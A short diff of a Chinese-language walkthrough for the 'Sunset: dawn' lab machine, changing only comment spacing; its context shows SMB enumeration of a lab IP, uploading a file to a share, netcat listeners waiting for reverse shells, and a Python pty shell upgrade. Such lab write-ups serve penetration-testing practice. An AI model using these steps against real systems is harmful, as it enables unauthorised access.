@@ -57,7 +57,7 @@ enum4linux -a 192.168.56.105
 > **和我们上面得到的信息联系起来了，所有出口一定在这里**
 
 ```
-smbclient //192.168.56.105/ITDEPT		# 使用SMB访问ITDEPT目录
+smbclient //192.168.56.105/ITDEPT		#使用SMB访问ITDEPT目录
 ```
 
 ![](./img/Sunset：dawn-07.png)
@@ -74,7 +74,7 @@ put web-control
 ![](./img/Sunset：dawn-08.png)
 
 ```
-# 监听等待
+#监听等待
 nc -lp 4444
 nc -lp 4445
 python -c 'import pty;pty.spawn("/bin/bash")'
